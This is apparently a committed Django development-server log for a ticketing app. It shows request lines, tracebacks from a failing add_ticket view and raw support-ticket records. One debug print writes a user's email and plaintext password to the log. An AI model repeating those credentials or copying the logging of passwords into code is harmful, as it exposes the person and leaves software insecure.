URL': None}, 'isArchived': False, 'description': None, 'timeEntryCount': '0', 'channelRelatedInfo': None, 'responseDueDate': None, 'isDeleted': False, 'modifiedBy': '7189000000042033', 'followerCount': '0', 'email': 'diana@gmail.com', 'layoutDetails': {'id': '7189000000055532', 'layoutName': 'PWSLab DevOps'}, 'channelCode': None, 'cf': {'cf_pwslab_project_url': None, 'cf_type': None}, 'isFollowing': False, 'layoutId': '7189000000055532', 'assigneeId': '7189000002705001', 'createdBy': '7189000000042033', 'teamId': None, 'tagCount': '0', 'attachmentCount': '0', 'category': 'NEW Project CI/CD Pipeline Setup'}
+Watching for file changes with StatReloader
+/var/www/html/PeerXP_React/Ticket/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 23, 2020 - 12:49:29
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+[23/Nov/2020 12:49:38] "GET /accounts/logout/ HTTP/1.1" 200 2
+[23/Nov/2020 12:49:38] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:49:41] "POST /accounts/login/ HTTP/1.1" 200 17
+[23/Nov/2020 12:49:41] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:49:42] "GET /tickets/all_tickets/ HTTP/1.1" 200 3830
+[23/Nov/2020 12:49:45] "GET /tickets/departments/?format=json HTTP/1.1" 200 98
+[23/Nov/2020 12:49:45] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:49:45] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+Internal Server Error: /tickets/add_ticket/
+Traceback (most recent call last):
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/views/decorators/http.py", line 40, in inner
+    return func(request, *args, **kwargs)
+  File "/var/www/html/PeerXP_React/Ticket/views.py", line 155, in add_ticket
+    payload = dict(zip(list(request.data.keys()),
+AttributeError: 'WSGIRequest' object has no attribute 'data'
+[23/Nov/2020 12:49:50] "POST /tickets/add_ticket/ HTTP/1.1" 500 16160
+[23/Nov/2020 12:50:00] "GET /static/js/main.232298e5.chunk.js.map HTTP/1.1" 304 0
+[23/Nov/2020 12:50:02] "GET /static/css/2.43b2b750.chunk.css.map HTTP/1.1" 200 487958
+[23/Nov/2020 12:50:16] "GET /static/js/2.e7c0fc50.chunk.js.map HTTP/1.1" 200 1040707
+Internal Server Error: /tickets/add_ticket/
+Traceback (most recent call last):
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/views/decorators/http.py", line 40, in inner
+    return func(request, *args, **kwargs)
+  File "/var/www/html/PeerXP_React/Ticket/views.py", line 155, in add_ticket
+    payload = dict(zip(list(request.data.keys()),
+AttributeError: 'WSGIRequest' object has no attribute 'data'
+[23/Nov/2020 12:50:18] "POST /tickets/add_ticket/ HTTP/1.1" 500 16160
+/var/www/html/PeerXP_React/Ticket/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 23, 2020 - 12:49:33
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+b'email=diana%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'diana@gmail.com'), ('password', '19661999')]
+Watching for file changes with StatReloader
+Internal Server Error: /tickets/add_ticket/
+Traceback (most recent call last):
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/views/decorators/http.py", line 40, in inner
+    return func(request, *args, **kwargs)
+  File "/var/www/html/PeerXP_React/Ticket/views.py", line 155, in add_ticket
+    payload = dict(zip(list(request.data.keys()),
+AttributeError: 'WSGIRequest' object has no attribute 'data'
+[23/Nov/2020 12:50:48] "POST /tickets/add_ticket/ HTTP/1.1" 500 16160
+Method Not Allowed (GET): /tickets/add_ticket/
+[23/Nov/2020 12:50:54] "GET /tickets/add_ticket/ HTTP/1.1" 405 0
+Internal Server Error: /tickets/add_ticket/
+Traceback (most recent call last):
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/views/decorators/http.py", line 40, in inner
+    return func(request, *args, **kwargs)
+  File "/var/www/html/PeerXP_React/Ticket/views.py", line 155, in add_ticket
+    payload = dict(zip(list(request.data.keys()),
+AttributeError: 'WSGIRequest' object has no attribute 'data'
+[23/Nov/2020 12:51:01] "POST /tickets/add_ticket/ HTTP/1.1" 500 16160
+/var/www/html/PeerXP_React/Ticket/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 23, 2020 - 12:50:47
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Internal Server Error: /tickets/add_ticket/
+[23/Nov/2020 12:51:24] "POST /tickets/add_ticket/ HTTP/1.1" 500 299
+Internal Server Error: /tickets/add_ticket/
+[23/Nov/2020 12:51:44] "POST /tickets/add_ticket/ HTTP/1.1" 500 79
+/var/www/html/PeerXP_React/Ticket/forms.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 23, 2020 - 12:51:19
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+[23/Nov/2020 12:53:14] "GET /new_ticket HTTP/1.1" 200 2713
+[23/Nov/2020 12:53:14] "GET /static/js/2.e7c0fc50.chunk.js HTTP/1.1" 304 0
+[23/Nov/2020 12:53:14] "GET /static/js/main.232298e5.chunk.js HTTP/1.1" 304 0
+[23/Nov/2020 12:53:15] "GET /tickets/departments/?format=json HTTP/1.1" 200 98
+[23/Nov/2020 12:53:15] "GET /static/js/2.e7c0fc50.chunk.js.map HTTP/1.1" 304 0
+[23/Nov/2020 12:53:15] "GET /static/js/main.232298e5.chunk.js.map HTTP/1.1" 304 0
+[23/Nov/2020 12:53:15] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[23/Nov/2020 12:53:15] "GET /favicon.ico HTTP/1.1" 200 2713
+Internal Server Error: /tickets/add_ticket/
+[23/Nov/2020 12:53:23] "POST /tickets/add_ticket/ HTTP/1.1" 500 129
+[23/Nov/2020 12:53:32] "POST /tickets/add_ticket/ HTTP/1.1" 200 16
+[23/Nov/2020 12:53:32] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:53:33] "GET /tickets/all_tickets/ HTTP/1.1" 200 3895
+[23/Nov/2020 12:53:35] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:53:35] "GET /tickets/departments/?format=json HTTP/1.1" 200 98
+[23/Nov/2020 12:53:36] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[23/Nov/2020 12:53:36] "GET /tickets/fetch_ticket/7189000003027649 HTTP/1.1" 200 415
+[23/Nov/2020 12:53:45] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:53:45] "GET /tickets/all_tickets/ HTTP/1.1" 200 3895
+[23/Nov/2020 12:53:55] "GET /tickets/departments/?format=json HTTP/1.1" 200 98
+[23/Nov/2020 12:53:55] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:53:55] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[23/Nov/2020 12:53:56] "GET /tickets/fetch_ticket/7189000003033301 HTTP/1.1" 200 381
+[23/Nov/2020 12:54:06] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:54:06] "GET /tickets/all_tickets/ HTTP/1.1" 200 3895
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 23, 2020 - 12:53:11
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+{'modifiedTime': '2020-11-23T12:53:31.000Z', 'subCategory': None, 'statusType': 'Open', 'subject': 'Google Down', 'dueDate': None, 'departmentId': '7189000000051431', 'channel': 'Phone', 'onholdTime': None, 'language': None, 'source': {'appName': None, 'extId': None, 'permalink': None, 'type': 'SYSTEM', 'appPhotoURL': None}, 'resolution': None, 'sharedDepartments': [], 'closedTime': None, 'approvalCount': '0', 'isTrashed': False, 'createdTime': '2020-11-23T12:53:31.000Z', 'id': '7189000003027649', 'isResponseOverdue': False, 'customerResponseTime': '2020-11-23T12:53:31.000Z', 'productId': None, 'contactId': '7189000000125039', 'threadCount': '0', 'secondaryContacts': [], 'priority': 'MED - System Impaired', 'classification': None, 'commentCount': '0', 'taskCount': '0', 'accountId': '7189000000107157', 'phone': None, 'webUrl': 'https://support.peerxp.com/support/peerxp/ShowHomePage.do#Cases/dv/7189000003027649', 'isSpam': False, 'status': 'Open', 'ticketNumber': '1295', 'sentiment': None, 'customFields': {'Type': None, 'PWSLab Project URL': None}, 'isArchived': False, 'description': None, 'timeEntryCount': '0', 'channelRelatedInfo': None, 'responseDueDate': None, 'isDeleted': False, 'modifiedBy': '7189000000042033', 'followerCount': '0', 'email': 'diana@gmail.com', 'layoutDetails': {'id': '7189000000055532', 'layoutName': 'PWSLab DevOps'}, 'channelCode': None, 'cf': {'cf_pwslab_project_url': None, 'cf_type': None}, 'isFollowing': False, 'layoutId': '7189000000055532', 'assigneeId': '7189000002705001', 'createdBy': '7189000000042033', 'teamId': None, 'tagCount': '0', 'attachmentCount': '0', 'category': 'NEW Project CI/CD Pipeline Setup'}
+{'modifiedTime': '2020-11-21T13:10:54.000Z', 'subCategory': None, 'statusType': 'Open', 'subject': 'Checking the Creation function ', 'dueDate': None, 'departmentId': '7189000000010772', 'channel': 'Phone', 'onholdTime': None, 'language': 'English', 'source': {'appName': None, 'extId': None, 'permalink': None, 'type': 'SYSTEM', 'appPhotoURL': None}, 'resolution': None, 'sharedDepartments': [], 'closedTime': None, 'approvalCount': '0', 'isTrashed': False, 'createdTime': '2020-11-21T13:10:54.000Z', 'id': '7189000003033301', 'isResponseOverdue': False, 'customerResponseTime': '2020-11-21T13:10:54.000Z', 'productId': None, 'contactId': '7189000000125039', 'threadCount': '0', 'secondaryContacts': [], 'priority': None, 'classification': None, 'commentCount': '0', 'taskCount': '0', 'accountId': '7189000000107157', 'phone': None, 'webUrl': 'https://support.peerxp.com/support/peerxp/ShowHomePage.do#Cases/dv/7189000003033301', 'isSpam': False, 'status': 'Open', 'ticketNumber': '1272', 'sentiment': None, 'customFields': {'Type': None, 'PWSLab Project URL': None}, 'isArchived': False, 'description': None, 'timeEntryCount': '0', 'channelRelatedInfo': None, 'responseDueDate': None, 'isDeleted': False, 'modifiedBy': '7189000000042033', 'followerCount': '0', 'email': None, 'layoutDetails': {'id': '7189000000011350', 'layoutName': 'PeerXP General Support'}, 'channelCode': None, 'cf': {'cf_pwslab_project_url': None, 'cf_type': None}, 'isFollowing': False, 'layoutId': '7189000000011350', 'assigneeId': None, 'createdBy': '7189000000042033', 'teamId': None, 'tagCount': '0', 'attachmentCount': '0', 'category': None}
